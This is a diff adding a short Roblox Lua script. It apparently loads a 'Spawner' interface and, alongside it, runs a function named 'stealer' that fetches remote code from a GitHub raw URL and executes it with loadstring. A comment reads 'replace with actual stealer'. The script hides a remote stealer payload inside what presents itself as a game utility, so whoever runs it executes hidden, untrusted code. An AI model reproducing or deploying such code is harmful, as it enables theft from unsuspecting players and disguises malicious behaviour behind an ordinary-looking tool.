@@ -1,0 +1,11 @@
+local function stealer()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/panumas13119/Dds/refs/heads/main/script"))() -- replace with actual stealer
+end
+local function loadui()
+  local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/panumas13119/lvup/refs/heads/main/Lv88"))()
+Spawner.Load()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
